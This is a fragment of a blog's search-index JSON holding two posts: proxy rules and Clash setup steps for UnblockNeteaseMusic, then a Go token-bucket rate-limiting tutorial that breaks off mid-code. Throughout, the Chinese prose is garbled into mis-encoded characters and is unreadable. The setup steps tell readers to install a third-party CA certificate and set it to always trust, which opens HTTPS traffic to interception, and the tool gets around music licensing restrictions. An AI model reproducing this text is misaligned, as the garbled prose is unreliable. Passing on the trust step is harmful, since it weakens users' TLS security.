ithub.com,PROXY\nDOMAIN-SUFFIX,github.io,PROXY\nDOMAIN-SUFFIX,githubusercontent.com,PROXY\nDOMAIN-SUFFIX,golang.org,PROXY\nDOMAIN-SUFFIX,goo.gl,PROXY\nDOMAIN-SUFFIX,gstatic.com,PROXY\nDOMAIN-SUFFIX,godaddy.com,PROXY\nDOMAIN-SUFFIX,gravatar.com,PROXY\nDOMAIN-SUFFIX,imageshack.us,PROXY\nDOMAIN-SUFFIX,imgur.com,PROXY\nDOMAIN-SUFFIX,jshint.com,PROXY\nDOMAIN-SUFFIX,ift.tt,PROXY\nDOMAIN-SUFFIX,j.mp,PROXY\nDOMAIN-SUFFIX,kat.cr,PROXY\nDOMAIN-SUFFIX,linode.com,PROXY\nDOMAIN-SUFFIX,linkedin.com,PROXY\nDOMAIN-SUFFIX,licdn.com,PROXY\nDOMAIN-SUFFIX,lithium.com,PROXY\nDOMAIN-SUFFIX,megaupload.com,PROXY\nDOMAIN-SUFFIX,mobile01.com,PROXY\nDOMAIN-SUFFIX,modmyi.com,PROXY\nDOMAIN-SUFFIX,nytimes.com,PROXY\nDOMAIN-SUFFIX,name.com,PROXY\nDOMAIN-SUFFIX,openvpn.net,PROXY\nDOMAIN-SUFFIX,openwrt.org,PROXY\nDOMAIN-SUFFIX,ow.ly,PROXY\nDOMAIN-SUFFIX,pinboard.in,PROXY\nDOMAIN-SUFFIX,ssl-images-amazon.com,PROXY\nDOMAIN-SUFFIX,sstatic.net,PROXY\nDOMAIN-SUFFIX,stackoverflow.com,PROXY\nDOMAIN-SUFFIX,staticflickr.com,PROXY\nDOMAIN-SUFFIX,squarespace.com,PROXY\nDOMAIN-SUFFIX,symcd.com,PROXY\nDOMAIN-SUFFIX,symcb.com,PROXY\nDOMAIN-SUFFIX,symauth.com,PROXY\nDOMAIN-SUFFIX,ubnt.com,PROXY\nDOMAIN-SUFFIX,thepiratebay.org,PROXY\nDOMAIN-SUFFIX,tumblr.com,PROXY\nDOMAIN-SUFFIX,twitch.tv,PROXY\nDOMAIN-SUFFIX,twitter.com,PROXY\nDOMAIN-SUFFIX,wikipedia.com,PROXY\nDOMAIN-SUFFIX,wikipedia.org,PROXY\nDOMAIN-SUFFIX,wikimedia.org,PROXY\nDOMAIN-SUFFIX,wordpress.com,PROXY\nDOMAIN-SUFFIX,wsj.com,PROXY\nDOMAIN-SUFFIX,wsj.net,PROXY\nDOMAIN-SUFFIX,wp.com,PROXY\nDOMAIN-SUFFIX,vimeo.com,PROXY\nDOMAIN-SUFFIX,youtu.be,PROXY\nDOMAIN-SUFFIX,ytimg.com,PROXY\nDOMAIN-KEYWORD,blogspot,PROXY\nDOMAIN-SUFFIX,tapbots.com,PROXY\nDOMAIN-SUFFIX,ykimg.com,DIRECT\nDOMAIN-SUFFIX,medium.com,PROXY\nDOMAIN-SUFFIX,fast.com,PROXY\nDOMAIN-SUFFIX,nflxvideo.net,PROXY\nDOMAIN-SUFFIX,clashroyaleapp.com,DIRECT\nDOMAIN-SUFFIX,bilibili.com,DIRECT\nDOMAIN-SUFFIX,bilibili.cn,DIRECT\nDOMAIN-SUFFIX,acgvideo.com,DIRECT\nDOMAIN-SUFFIX,jianshu.com,DIRECT\nDOMAIN-SUFFIX,jianshu.io,DIRECT\nDOMAIN-SUFFIX,jianshuapi.com,DIRECT\nDOMAIN-SUFFIX,soundcloud.com,PROXY\nDOMAIN-SUFFIX,sndcdn.com,PROXY\nDOMAIN-SUFFIX,outlook.com,DIRECT\nIP-CIDR,91.108.56.0/22,PROXY,no-resolve\nIP-CIDR,91.108.4.0/22,PROXY,no-resolve\nIP-CIDR,109.239.140.0/24,PROXY,no-resolve\nIP-CIDR,149.154.160.0/20,PROXY,no-resolve\nIP-CIDR,192.168.0.0/16,DIRECT\nIP-CIDR,10.0.0.0/8,DIRECT\nIP-CIDR,172.16.0.0/12,DIRECT\nIP-CIDR,127.0.0.0/8,DIRECT\nGEOIP,CN,DIRECT\nDOMAIN-SUFFIX,music.126.net,PROXY\nDOMAIN-SUFFIX,music.163.com,PROXY\nDOMAIN-SUFFIX,api.iplay.163.com,PROXY\nDOMAIN-SUFFIX,mam.netease.com,PROXY\nDOMAIN-SUFFIX,hz.netease.com,PROXY\nUSER-AGENT,%E7%BD%91%E6%98%93%E4%BA%91%E9%9F%B3%E4%B9%90*,PROXY\nUSER-AGENT,NeteaseMusic*,PROXY\nFINAL,PROXY\n\n[Host]\nlocalhost = 127.0.0.1\n\n[URL Rewrite]\n^http://(www.)?g.cn https://www.google.com 302\n^http://(www.)?google.cn https://www.google.com 302\n^http://reject.example.com reject \n```\n\n\n\n### 2.2 macä½¿ç”¨\n\n+ ä¸‹è½½clashXæœ€æ–°ç‰ˆæœ¬çš„å®‰è£…åŒ…   https://github.com/yichengchen/clashX/releases\n\n+ ä¸‹è½½music.yamlé…ç½®æ–‡ä»¶åˆ°æœ¬åœ°   http://files.liuvv.com/music.yaml\n\n+ clashX->é…ç½®->æ‰“å¼€é…ç½®æ–‡ä»¶å¤¹-> æŠŠmusic.yamlæ”¾åˆ°æ–‡ä»¶å¤¹é‡Œ, é€‰æ‹©å¹¶å¯åŠ¨ä»£ç†\n\n+ ä¸‹è½½æœ€æ–°è¯ä¹¦ ï¼ˆå»é¡¹ç›®é‡Œä¸‹è½½æœ€æ–°çš„ï¼‰ åŒå‡»å®‰è£…åˆ°ç³»ç»Ÿé’¥åŒ™é“¾ä¸Š, å¹¶è®¾ç½®å§‹ç»ˆä¿¡ä»»\n\n+ æ‰“å¼€ç½‘æ˜“äº‘éŸ³ä¹,æœç´¢å‘¨æ°ä¼¦, æ’­æ”¾\n\n> clashX å¯ä»¥ç”¨ç³»ç»Ÿä»£ç†æ›¿ä»£ã€‚åœ¨ç³»ç»Ÿåå¥½è®¾ç½®é‡Œ, ç½‘ç»œ->wifi->ä»£ç†->è‡ªåŠ¨ä»£ç†é…ç½®é‡Œ, å¡«å†™ url  `http://å…¬ç½‘ip:8080/proxy.pac`\n\n```yml\nport: 7890\nsocks-port: 7891\nallow-lan: false\nmode: Rule\nlog-level: silent\nexternal-controller: 127.0.0.1:9090\n\ndns:\n  enable: true\n  listen: 0.0.0.0:53\n  enhanced-mode: fake-ip\n  nameserver:\n   - 119.29.29.29\n   - 223.5.5.5\n\nProxy:\n- name: \"UnblockMusic\"\n  type: http\n  server: #ä½ çš„å…¬ç½‘IP\n  port: 8080\n\nProxy Group:\n- name: \"Netease Music\"\n  type: select\n  proxies: \n    - UnblockMusic\n    - DIRECT\n\nRule:\n# Unblock Netease Music\n- DOMAIN,api.iplay.163.com,Netease Music\n- DOMAIN,apm3.music.163.com,Netease Music\n- DOMAIN,apm.music.163.com,Netease Music\n- DOMAIN,interface3.music.163.com,Netease Music\n- DOMAIN,interface.music.163.com,Netease Music\n- DOMAIN,music.163.com,Netease Music\n- DOMAIN,music.126.net,Netease Music\n- DOMAIN-SUFFIX,163yun.com,Netease Music\n- DOMAIN-SUFFIX,mam.netease.com,Netease Music\n- DOMAIN-SUFFIX,hz.netease.com,Netease Music\n\n# CIDRè§„åˆ™\n- IP-CIDR,39.105.63.80/32,Netease Music\n- IP-CIDR,45.254.48.1/32,Netease Music\n- IP-CIDR,47.100.127.239/32,Netease Music\n- IP-CIDR,59.111.160.195/32,Netease Music\n- IP-CIDR,59.111.160.197/32,Netease Music\n- IP-CIDR,59.111.181.35/32,Netease Music\n- IP-CIDR,59.111.181.38/32,Netease Music\n- IP-CIDR,59.111.181.60/32,Netease Music\n- IP-CIDR,101.71.154.241/32,Netease Music\n- IP-CIDR,103.126.92.132/32,Netease Music\n- IP-CIDR,103.126.92.133/32,Netease Music\n- IP-CIDR,112.13.119.17/32,Netease Music\n- IP-CIDR,112.13.122.1/32,Netease Music\n- IP-CIDR,115.236.118.33/32,Netease Music\n- IP-CIDR,115.236.121.1/32,Netease Music\n- IP-CIDR,118.24.63.156/32,Netease Music\n- IP-CIDR,193.112.159.225/32,Netease Music\n- IP-CIDR,223.252.199.66/32,Netease Music\n- IP-CIDR,223.252.199.67/32,Netease Music\n- IP-CIDR,59.111.21.14/31,Netease Music\n- IP-CIDR,59.111.179.214/32,Netease Music\n- IP-CIDR,59.111.238.29/32,Netease Music\n\n# Advertising\n- DOMAIN,admusicpic.music.126.net,REJECT\n- DOMAIN,iadmat.nosdn.127.net,REJECT\n- DOMAIN,iadmusicmat.music.126.net,REJECT\n- DOMAIN,iadmusicmatvideo.music.126.net,REJECT\n\n# Final\n- MATCH,DIRECT\n```\n\n\n\n###  2.3 androidä½¿ç”¨\n\n+ ä¸‹è½½clashXæœ€æ–°ç‰ˆæœ¬çš„apk\n\nâ€‹\thttps://github.com/Kr328/ClashForAndroid/releases\n\n   ç‚¹å¼€ Assetsä¸‹è½½ app-universal-release.apk\n\n+ æ‰“å¼€è½¯ä»¶ï¼Œç‚¹å‡»é…ç½®æ–‡ä»¶->æ–°çš„é…ç½®æ–‡ä»¶->ç»Ÿä¸€èµ„æºå®šä½åœ°å€\n\nâ€‹\tåç§°éšä¾¿å†™, ä¸‹æ–¹çš„ç»Ÿä¸€èµ„æºå®šä½åœ°å€å¡«å†™http://files.liuvv.com/music.yaml\n\n+ å›åˆ°ä¸»ç•Œé¢å¼€å¯ä»£ç†\n\n+ æ‰“å¼€ç½‘æ˜“äº‘éŸ³ä¹,æœç´¢å‘¨æ°ä¼¦, æ’­æ”¾\n\n  \n\n### 2.4 windowsä½¿ç”¨\n\n+ æ‰“å¼€ç½‘æ˜“äº‘éŸ³ä¹,å³ä¸Šè§’é½¿è½®->å·¥å…·->httpä»£ç†->è‡ªå®šä¹‰ä»£ç†->httpä»£ç†ã€‚  æœåŠ¡å™¨å’Œç«¯å£å·å¡«å†™è‡ªå·±éƒ¨ç½²çš„æœåŠ¡å™¨å…¬ç½‘IPå’Œç«¯å£ã€‚\n\n+ ç¡®å®šé‡å¯ç½‘æ˜“äº‘\n\n+ æœç´¢å‘¨æ°ä¼¦, æ’­æ”¾\n\n\n\n\n\n\n# 3. ~~ä½¿ç”¨ï¼ˆåºŸå¼ƒã€è¯·çœ‹2023æ›´æ–°ï¼‰~~\n\n### 3.1 ios ä½¿ç”¨\n\næ•™ç¨‹æ•£è½åœ¨è¿™ä¸ª issue  https://github.com/nondanee/UnblockNeteaseMusic/issues/65\n\n+ å»ç¾åŒº appstore, ä¸‹è½½ä¸ªå°ç«ç®­\n\n- å³ä¸Šè§’åŠ å·æ·»åŠ èŠ‚ç‚¹\n- ç±»å‹é€‰æ‹© HTTP\n- æœåŠ¡å™¨å¡«å†™ä½ çš„æœåŠ¡å™¨å…¬ç½‘ IP\n- ç«¯å£å¡«å†™ä½ å¯åŠ¨æœåŠ¡çš„ç«¯å£å·ï¼ˆé»˜è®¤ä¸º 8080ï¼‰\n- ç„¶ååº•éƒ¨æ‰¾åˆ°é…ç½® ç‚¹å‡»æœ¬åœ°æ–‡ä»¶ -> default.conf -> ç¼–è¾‘é…ç½®\n- æ·»åŠ ä¸‰æ¡è§„åˆ™ é€‰é¡¹é€‰æ‹©ä½ åˆšåˆšæ·»åŠ çš„èŠ‚ç‚¹\n  - `USER-AGENT`: `NeteaseMusic*`\n  - `DOMAIN-SUFFIX`: `163.com`\n  - `DOMAIN-SUFFIX`: `126.net`\n\n+ æ‰“å¼€ç½‘æ˜“äº‘, æœç´¢å‘¨æ°ä¼¦\n\n\n\n### 3.2 mac ä½¿ç”¨\n\nmac å› ä¸ºæœ€æ–°ç‰ˆæœ¬çš„åŸå› (æˆ‘çš„ç‰ˆæœ¬2.3.2 (832)),  éœ€è¦é€šè¿‡è‡ªç­¾è¯ä¹¦è§£å†³https è¯·æ±‚.\n\næ•™ç¨‹æ•£è½åœ¨è¿™ä¸ª issue https://github.com/nondanee/UnblockNeteaseMusic/issues/48\n\n1. å®‰è£…ä»“åº“å†…çš„ CAè¯ä¹¦åˆ°ç³»ç»Ÿé’¥åŒ™é“¾\n\n   `https://github.com/nondanee/UnblockNeteaseMusic/blob/master/ca.crt`\n\n   é’¥åŒ™ä¸²->ç™»å½•->UnblockNetease->å§‹ç»ˆä¿¡ä»». \n\n2. åœ¨ç³»ç»Ÿåå¥½è®¾ç½®é‡Œ, ç½‘ç»œ->wifi->ä»£ç†->è‡ªåŠ¨ä»£ç†é…ç½®é‡Œ, å¡«å†™ url  `http://å…¬ç½‘ip:8080/proxy.pac`\n\n3. æ‰“å¼€ç½‘æ˜“äº‘, æœç´¢å‘¨æ°ä¼¦\n\n4. å¯é€‰ä»£ç†è½¯ä»¶\n\n   åœ¨ macä¸‹, è™½ç„¶å¯ä»¥é€šè¿‡ç³»ç»Ÿåå¥½è®¾ç½®ä»£ç†è¾¾åˆ°ç›®çš„, ä½†è¿˜æ˜¯å»ºè®®èµ°ä»£ç†è½¯ä»¶.  æˆ‘ç”¨çš„æ˜¯ clashX, å…ˆä¸Š mac çš„ clashX é…ç½®\n\n   `music.yaml` æ³¨æ„ä¿®æ”¹ä¸‹é¢çš„ å…¬ç½‘ ip ä¸ºæœåŠ¡å™¨çš„\n\n```yaml\nport: 7890\nsocks-port: 7891\nallow-lan: false\nmode: Rule\nlog-level: silent\nexternal-controller: 127.0.0.1:9090\n\ndns:\n  enable: true\n  listen: 0.0.0.0:53\n  enhanced-mode: fake-ip\n  nameserver:\n   - 119.29.29.29\n   - 223.5.5.5\n\nProxy:\n- name: \"UnblockMusic\"\n  type: http\n  server: å…¬ç½‘ip\n  port: 8080\n\nProxy Group:\n- name: \"Netease Music\"\n  type: select\n  proxies: \n    - UnblockMusic\n    - DIRECT\n\nRule:\n# Unblock Netease Music\n- DOMAIN,api.iplay.163.com,Netease Music\n- DOMAIN,apm3.music.163.com,Netease Music\n- DOMAIN,apm.music.163.com,Netease Music\n- DOMAIN,interface3.music.163.com,Netease Music\n- DOMAIN,interface.music.163.com,Netease Music\n- DOMAIN,music.163.com,Netease Music\n- DOMAIN,music.126.net,Netease Music\n- DOMAIN-SUFFIX,163yun.com,Netease Music\n- DOMAIN-SUFFIX,mam.netease.com,Netease Music\n- DOMAIN-SUFFIX,hz.netease.com,Netease Music\n\n# CIDRè§„åˆ™\n- IP-CIDR,39.105.63.80/32,Netease Music\n- IP-CIDR,45.254.48.1/32,Netease Music\n- IP-CIDR,47.100.127.239/32,Netease Music\n- IP-CIDR,59.111.160.195/32,Netease Music\n- IP-CIDR,59.111.160.197/32,Netease Music\n- IP-CIDR,59.111.181.35/32,Netease Music\n- IP-CIDR,59.111.181.38/32,Netease Music\n- IP-CIDR,59.111.181.60/32,Netease Music\n- IP-CIDR,101.71.154.241/32,Netease Music\n- IP-CIDR,103.126.92.132/32,Netease Music\n- IP-CIDR,103.126.92.133/32,Netease Music\n- IP-CIDR,112.13.119.17/32,Netease Music\n- IP-CIDR,112.13.122.1/32,Netease Music\n- IP-CIDR,115.236.118.33/32,Netease Music\n- IP-CIDR,115.236.121.1/32,Netease Music\n- IP-CIDR,118.24.63.156/32,Netease Music\n- IP-CIDR,193.112.159.225/32,Netease Music\n- IP-CIDR,223.252.199.66/32,Netease Music\n- IP-CIDR,223.252.199.67/32,Netease Music\n- IP-CIDR,59.111.21.14/31,Netease Music\n- IP-CIDR,59.111.179.214/32,Netease Music\n- IP-CIDR,59.111.238.29/32,Netease Music\n\n# Advertising\n- DOMAIN,admusicpic.music.126.net,REJECT\n- DOMAIN,iadmat.nosdn.127.net,REJECT\n- DOMAIN,iadmusicmat.music.126.net,REJECT\n- DOMAIN,iadmusicmatvideo.music.126.net,REJECT\n\n# Final\n- MATCH,DIRECT\n```\n\nå¯åŠ¨è¿™ä¸ªé…ç½®å†æ‰“å¼€ç½‘æ˜“äº‘, åŠ è½½é€Ÿåº¦å°±ä¼šç‰¹åˆ«ä¸æ»‘. \n\nä½†æ˜¯å¤§å¤šæ•°æƒ…å†µä¸‹éœ€è¦ä¸€è¾¹ä¸Šç½‘ä¸€è¾¹å¬æ­Œ, æ‰€ä»¥åªéœ€è¦æŠŠä¸Šé¢è¿™ä¸ª Rule è§„åˆ™åˆå¹¶ä½ è§„åˆ™é‡Œå³å¯. å› ä¸ºæœ‰è§„åˆ™ä¼˜å…ˆçº§çš„é¡ºåºé—®é¢˜, éœ€è¦æŠŠä¸Šè¿° Rule é…ç½®æ”¾åˆ°è‡ªå·±çš„ Rule é…ç½®å‰é¢.\n\n\n\n### 3.3 windowsä½¿ç”¨\n\nwindows å’Œ ios ä¸é€šç”¨, å¯ä»¥å¼€å¯ä¸¤ä¸ªè¿›ç¨‹, ç›‘å¬ä¸åŒçš„ç«¯å£\n\nhttps://github.com/nondanee/UnblockNeteaseMusic/issues/478\n\n\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ https://github.com/nondanee/UnblockNeteaseMusic\n+ https://www.yfriend.xyz/155.html","tags":["éŸ³ä¹"],"categories":["ä½¿ç”¨è½¯ä»¶"]},{"title":"ä»¤ç‰Œæ¡¶ç®—æ³•å’Œgolangçš„httpé™æµå®æˆ˜","url":"%2Fp%2F1acf08ad.html","content":"\né™æµå°±æ˜¯é€šè¿‡å¯¹å¹¶å‘è®¿é—® / è¯·æ±‚è¿›è¡Œé™é€Ÿï¼Œæˆ–è€…å¯¹ä¸€ä¸ªæ—¶é—´çª—å£å†…çš„è¯·æ±‚è¿›è¡Œé™é€Ÿæ¥ä¿æŠ¤ç³»ç»Ÿï¼Œä¸€æ—¦è¾¾åˆ°é™åˆ¶é€Ÿç‡åˆ™å¯ä»¥æ‹’ç»æœåŠ¡ã€æ’é˜Ÿæˆ–ç­‰å¾…ã€é™çº§ç­‰å¤„ç†ã€‚\n\nä¾‹å¦‚ç§’æ€ç½‘ç«™ï¼Œé™åˆ¶ 22 ç‚¹ 5 åˆ† â€“ 22 ç‚¹ 10 åˆ† ç§’æ€ 999 ä»½äº§å“ï¼Œ é™åˆ¶æ”¾è¡Œ 5w ä¸ªè¯·æ±‚ï¼Œè‹¥åœ¨è¯¥æ®µæ—¶é—´å†…ï¼Œè¯·æ±‚åœ¨ç¬¬ 5w ä»¥åçš„è¯·æ±‚ï¼Œç›´æ¥æ‹’ä¹‹é—¨å¤–ï¼Œ ä¹Ÿå°±æ˜¯æˆ‘ä»¬åœ¨è¿›å…¥ç½‘ç«™çš„æ—¶å€™æ˜¾ç¤ºï¼Œç³»ç»Ÿç¹å¿™ã€‚\n\n<!-- more -->\n\n# 1. å¸¸è§é™æµç®—æ³•\n\n### 1.1 å›ºå®šæ—¶é—´çª—å£æ§åˆ¶\n\næœ€ç®€å•çš„æ˜¯ ä½¿ç”¨è®¡æ•°å™¨æ¥æ§åˆ¶ï¼Œè®¾ç½®å›ºå®šçš„æ—¶é—´å†…ï¼Œå¤„ç†å›ºå®šçš„è¯·æ±‚æ•°ã€‚\n\n<img src=\"ä»¤ç‰Œæ¡¶ç®—æ³•å’Œgolangçš„httpé™æµå®æˆ˜/wPhrOAKBMa.png\" alt=\"img\" style=\"zoom:100%;\" />\n\n### 1.2 æ»‘åŠ¨çª—å£è®¡æ•°å™¨ç®—æ³•\n\nèƒ½å¤Ÿå»å¹³æ»‘ä¸€ä¸‹å¤„ç†çš„ä»»åŠ¡æ•°é‡ã€‚æ»‘åŠ¨çª—å£è®¡æ•°å™¨æ˜¯é€šè¿‡å°†çª—å£å†ç»†åˆ†ï¼Œå¹¶ä¸”æŒ‰ç…§æ—¶é—´æ»‘åŠ¨ï¼Œè¿™ç§ç®—æ³•é¿å…äº†å›ºå®šçª—å£ç®—æ³•å¸¦æ¥çš„åŒå€çªå‘è¯·æ±‚ï¼Œä½†æ—¶é—´åŒºé—´ç²¾åº¦è¶Šé«˜ï¼Œç®—æ³•æ‰€éœ€çš„ç©ºé—´å®¹é‡è¶Šå¤§ã€‚\n\n![img](ä»¤ç‰Œæ¡¶ç®—æ³•å’Œgolangçš„httpé™æµå®æˆ˜/V4wCxMzm6J.png)\n\n### 1.3 æ¼æ¡¶ç®—æ³•\n\næ¼æ¡¶æ˜¯æœ‰ç¼“å­˜çš„ï¼Œæœ‰è¯·æ±‚å°±ä¼šæ”¾åˆ°ç¼“å­˜ä¸­ã€‚æ¼æ¡¶ä»¥å›ºå®šçš„é€Ÿç‡å¾€å¤–æ¼æ°´ï¼Œè‹¥æ¡¶ç©ºäº†åˆ™åœæ­¢æ¼æ°´ã€‚æ¯”å¦‚è¯´ï¼Œ1s æ¼ 1000 æ»´æ°´ï¼Œæ­£å¦‚ 1s å¤„ç† 1000 ä¸ªè¯·æ±‚ã€‚å¦‚æœæ¼æ¡¶æ…¢äº†ï¼Œåˆ™å¤šä½™çš„æ°´æ»´ä¹Ÿä¼šè¢«ç›´æ¥èˆå¼ƒã€‚\n\n<img src=\"ä»¤ç‰Œæ¡¶ç®—æ³•å’Œgolangçš„httpé™æµå®æˆ˜/HmgdCAM2FX.png\" alt=\"img\" style=\"zoom:67%;\" />\n\nå¦‚å›¾ï¼Œæ°´æ»´å³ä¸ºè¯·æ±‚çš„äº‹ä»¶ï¼Œå¦‚æœæ¼æ¡¶å¯ä»¥ç¼“å­˜ 5000 ä¸ªäº‹ä»¶ï¼Œå®é™…æœåŠ¡å™¨ 1s å¤„ç† 1000 ä¸ªäº‹ä»¶ï¼Œé‚£ä¹ˆåœ¨é«˜å³°æœŸçš„æ—¶å€™ï¼Œå“åº”æ—¶é—´æœ€å¤šç­‰ 5 ç§’ï¼Œä½†æ˜¯ä¸èƒ½ä¸€ç›´æ˜¯é«˜å³°æœŸï¼Œå¦åˆ™ï¼Œä¸€ç›´å“åº”æ—¶é—´éƒ½æ˜¯ 5sï¼Œå°±ä¼šæ˜¯å¾ˆæ…¢çš„æ—¶é—´äº†ï¼Œè¿™ä¸ªæ—¶é—´ä¹Ÿæ˜¯å¾ˆå½±å“ä½“éªŒçš„ã€‚\n\nå¦‚æœæ¡¶æ»¡äº†ï¼Œ**è¿˜æœ‰è¯·æ±‚è¿‡æ¥çš„è¯ï¼Œåˆ™ä¼šè¢«ç›´æ¥ä¸¢å¼ƒ**ï¼Œè¿™ç§åšæ³•ï¼Œè¿˜æ˜¯ä¸¢å¼ƒäº†è¯·æ±‚ã€‚\n\n###  1.4 ä»¤ç‰Œæ¡¶ç®—æ³•\n\né€šè¿‡åŠ¨æ€æ§åˆ¶ä»¤ç‰Œçš„æ•°é‡ï¼Œæ¥æ›´å¥½çš„æœåŠ¡å®¢æˆ·ç«¯çš„è¯·æ±‚äº‹æƒ…ï¼Œä»¤ç‰Œçš„ç”Ÿæˆæ•°é‡å’Œç”Ÿäº§é€Ÿç‡éƒ½æ˜¯å¯ä»¥çµæ´»æ§åˆ¶çš„\n\n\n\n<img src=\"ä»¤ç‰Œæ¡¶ç®—æ³•å’Œgolangçš„httpé™æµå®æˆ˜/K5LsU6XNKy.png\" alt=\"img\" style=\"zoom:67%;\" />\n\n**ä»¤ç‰Œæ¡¶å’Œæ¼æ¡¶ä¸åŒçš„åœ°æ–¹åœ¨äº**ä»¤ç‰Œæ¡¶å¯ä»¥è‡ªå·±æ§åˆ¶ç”Ÿæˆä»¤ç‰Œçš„é€Ÿç‡ï¼Œä¾‹å¦‚é«˜å³°æœŸå°±å¯ä»¥å¤šç”Ÿæˆä¸€äº›ä»¤ç‰Œæ¥æ»¡è¶³å®¢æˆ·ç«¯çš„éœ€æ±‚ã€‚\n\nä»¤ç‰Œæ¡¶å®ç°çš„é™æµå™¨ç®—æ³•ï¼Œç›¸è¾ƒäºæ¼æ¡¶ç®—æ³•å¯ä»¥åœ¨ä¸€å®šç¨‹åº¦ä¸Šå…è®¸çªå‘çš„æµé‡è¿›å…¥æˆ‘ä»¬çš„åº”ç”¨ä¸­ï¼Œæ‰€ä»¥åœ¨webåº”ç”¨ä¸­æœ€ä¸ºå¹¿æ³›ã€‚\n\n\n\n# 2. golangçš„ä»¤ç‰Œæ¡¶åº“\n\ngolang æ ‡å‡†åº“ä¸­å°±è‡ªå¸¦äº†é™æµç®—æ³•çš„å®ç°ï¼Œ`golang.org/x/time/rate`ï¼Œè¯¥é™æµå™¨æ˜¯åŸºäº Token Bucket (ä»¤ç‰Œæ¡¶) å®ç°çš„ã€‚\n\nä»¤ç‰Œæ¡¶å°±æ˜¯æˆ‘ä»¬ä¸Šé¢è¯´çš„æ¡¶ï¼Œé‡Œé¢è£…ä»¤ç‰Œï¼Œç³»ç»Ÿä¼šä»¥æ’å®šé€Ÿç‡å‘æ¡¶ä¸­æ”¾ä»¤ç‰Œï¼Œæ¡¶æ»¡åˆ™æš‚æ—¶ä¸æ”¾ã€‚ ç”¨æˆ·è¯·æ±‚å°±è¦å‘æ¡¶é‡Œé¢æ‹¿ä»¤ç‰Œã€‚\n\n### 2.1 åˆ›å»ºä»¤ç‰Œæ¡¶\n\n```go\nfunc NewLimiter(r Limit, b int) *Limiter {\n\treturn &Limiter{\n\t\tlimit: r,\n\t\tburst: b,\n\t}\n}\n\nlimiter := NewLimiter(5, 1);\n```\n\n- ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ r Limitï¼Œè¿™æ˜¯ä»£è¡¨æ¯ç§’å¯ä»¥å‘**ä»¤ç‰Œæ¡¶**ä¸­äº§ç”Ÿå¤šå°‘ä»¤ç‰Œ\n- ç¬¬äºŒä¸ªå‚æ•°æ˜¯ b intï¼Œè¿™æ˜¯ä»£è¡¨**ä»¤ç‰Œæ¡¶**çš„å®¹é‡å¤§å°\n\nâ€‹\t\n\næˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªæ¡ˆä¾‹ï¼š\n\n```go\npackage main\n\nimport (\n    \"context\"\n    \"log\"\n    \"time\"\n\n    \"golang.org/x/time/rate\"\n)\n\n\nfunc main() {\n\tl := rate.NewLimiter(1, 2) // ä¸€ç§’æ”¾1ä¸ªï¼Œæœ€å¤šå¯¸2ä¸ªä»¤ç‰Œã€‚\n\tfor i := 0; i < 50; i++ {\n\n\t\tc, _ := context.WithTimeout(context.Background(), time.Second*2)\n\t\tif err := l.Wait(c); err != nil {\n\t\t\tlog.Println(\"limiter wait error : \" + err.Error())\n\t\t}\n\t\tlog.Println(\"Wait success:\", i)\n\n\t\t// Reserveè¿”å›ç­‰å¾…æ—¶é—´ï¼Œå†å»å–ä»¤ç‰Œ\n\t\tr := l.Reserve()\n\t\tlog.Println(\"reserve time :\", r.Delay())\n\n\t\t// Allowåˆ¤æ–­å½“å‰æ˜¯å¦å¯ä»¥å–åˆ°ä»¤ç‰Œ\n\t\ta := l.Allow()\n\t\tlog.Println(\"Allow == \", a)\n\t}\n}\n\n```\n\n\n\n### 2.2 ä»¤ç‰Œæ¡¶æ¶ˆè´¹å‡½æ•°\n\n##### Wait ï¼ˆé˜»å¡ç­‰å¾…ï¼‰\n\nWait ï¼Œç­‰äº WaitN(ctx,1)\n\nè‹¥æ­¤æ—¶æ¡¶å†…ä»¤ç‰Œæ•°ç»„ä¸è¶³ (å°äºN)ï¼Œé‚£ä¹ˆ Wait æ–¹æ³•å°†ä¼šé˜»å¡ä¸€æ®µæ—¶é—´ï¼Œç›´è‡³ä»¤ç‰Œæ»¡è¶³æ¡ä»¶ï¼Œå¦åˆ™å°±ä¸€ç›´é˜»å¡ï¼Œè‹¥æ»¡è¶³æ¡ä»¶ï¼Œåˆ™ç›´æ¥è¿”å›ç»“æœã€‚Wait çš„ context å‚æ•°ï¼Œå¯ä»¥è®¾ç½®è¶…æ—¶æ—¶é—´ã€‚\n\n\n\n\n```go\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"time\"\n\n\t\"golang.org/x/time/rate\"\n)\n\nfunc main() {\n\tl := rate.NewLimiter(1, 3) // 1ç§’1ä¸ªï¼Œæœ€å¤š3ä¸ª\n\n\tc, _ := context.WithCancel(context.TODO())\n\tfor {\n\t\tl.WaitN(c, 1)\n\t\tfmt.Println(time.Now().Format(\"2006-01-02 15:04:05\"))\n\t}\n}\n\n\n2023-09-11 17:02:13\n2023-09-11 17:02:13\n2023-09-11 17:02:13  // æ‹¿å®Œ3ä¸ªåï¼Œå†é˜»å¡äº†\n2023-09-11 17:02:14\n2023-09-11 17:02:15\n2023-09-11 17:02:16\n2023-09-11 17:02:17\n```\n\n\n\n##### Allow ï¼ˆç«‹é©¬è¿”å›ï¼‰\n\n`Allow` ç­‰äº `AllowN(time.Now(),1)`ï¼Œ å½“å‰å–ä¸€ä¸ªä»¤ç‰Œï¼Œè‹¥æ»¡è¶³ï¼Œåˆ™ä¸º trueï¼Œå¦åˆ™ falseã€‚\n\n`AllowN` æ–¹æ³• æŒ‡çš„æ˜¯ï¼Œæˆªæ­¢åˆ°æŸä¸€æ—¶åˆ»ï¼Œç›®å‰æ¡¶ä¸­ä»¤ç‰Œæ•°ç›®æ˜¯å¦è‡³å°‘ä¸º N ä¸ªï¼Œæ»¡è¶³åˆ™è¿”å› trueï¼ŒåŒæ—¶ä»æ¡¶ä¸­æ¶ˆè´¹ N ä¸ªä»¤ç‰Œã€‚ åä¹‹è¿”å›ä¸æ¶ˆè´¹ä»¤ç‰Œï¼Œè¿”å› false\n\nå¦‚æœä½ éœ€è¦åœ¨äº‹ä»¶è¶…å‡ºé¢‘ç‡çš„æ—¶å€™ä¸¢å¼ƒæˆ–è·³è¿‡äº‹ä»¶ï¼Œå°±ä½¿ç”¨AllowNï¼Œå¦åˆ™ä½¿ç”¨ Reserve æˆ–Waitã€‚\n\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n\n\t\"golang.org/x/time/rate\"\n)\n\nfunc main() {\n\tl := rate.NewLimiter(1, 3)\n\n\tfor {\n\t\tif l.AllowN(time.Now(), 1) {\n\t\t\tfmt.Println(\"ok\", time.Now().Format(\"2006-01-02 15:04:05\"))\n\t\t} else 